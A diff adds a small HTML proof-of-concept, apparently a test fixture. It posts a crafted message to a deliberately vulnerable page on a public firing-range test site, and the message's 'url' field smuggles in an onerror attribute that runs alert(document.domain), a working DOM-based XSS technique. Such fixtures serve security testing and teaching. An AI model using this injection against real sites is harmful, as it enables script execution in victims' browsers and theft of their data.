@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <iframe id=iframe></iframe>
+    <script>
+      function postMessageExploit(exploit, url) {
+        var iframe = document.getElementById('iframe');
+        iframe.addEventListener('load', () => { 
+          iframe.contentWindow.postMessage(exploit, '*');
+        });
+        iframe.src = url;
+      }
+      postMessageExploit(JSON.stringify({
+        url: '0" onerror="alert(document.domain)'
+      }),
+      'https://public-firing-range.appspot.com/dom/toxicdom/postMessage/documentWrite');
+    </script>
+  </body>
+</html>
